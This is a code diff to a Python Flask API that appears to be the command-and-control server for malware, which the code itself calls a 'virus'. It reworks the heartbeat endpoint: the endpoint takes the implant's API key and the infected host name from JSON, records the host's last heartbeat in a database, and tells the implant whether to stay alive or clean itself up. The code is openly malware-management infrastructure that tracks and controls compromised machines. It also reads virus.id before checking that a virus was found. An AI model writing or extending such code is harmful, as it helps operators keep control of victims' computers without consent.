@@ -169,9 +169,14 @@ def uploadCompiledJob():
 # API to handle heartbeat ask from virus, if the virus is set to is_alive = False, the virus will clean it self up
 @api.route('/api/heartbeat', methods=['GET', 'POST'])
 def heartbeat():
+    print("Heartbeat called")
     try:
         # Retrieve the API key from the request
-        virus_api = request.headers.get('Authorization')
+        # virus_api = request.headers.get('Authorization')
+        virus_api = request.json.get('api_key')
+        #data = request.json.get('data')
+        hostname = request.json.get('host_name')
+        print(hostname)
         #hostname = request.form.get('host_name')
         print(virus_api)
 
@@ -180,17 +185,27 @@ def heartbeat():
 
         # Check if the virus exists with the provided API key
         virus = Virus.query.filter_by(virus_api=virus_api).first()
-
+        # Getting host in order with virus ID in order to update the last heartbeat 
+        host = Hosts.query.filter_by(host_name=hostname, virus_id=virus.id).first()
+        print(host)
+        if host:
+            host.last_heartbeat = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
+            # Commit changes to the database
+            db.session.commit()
+        else:
+            print("Could not get host")
 
         #host = Hosts.query.filter_by(host_name=hostname, virus_id=virus.id).first()
 
         if not virus:
+            print("Invalid API key")
             return jsonify({'message': 'Invalid API key'}), 404
-
         # Check the is_alive status
         if virus.is_alive:
+            print("Virus is alive")
             return jsonify({'message': 'Virus is alive', 'is_alive': 'True'}), 200
         else:
+            print("Virus is not alive. Clean up required")
             return jsonify({'message': 'Virus is not alive. Clean up required.', 'is_alive': 'False'}), 200
 
     except Exception as e:
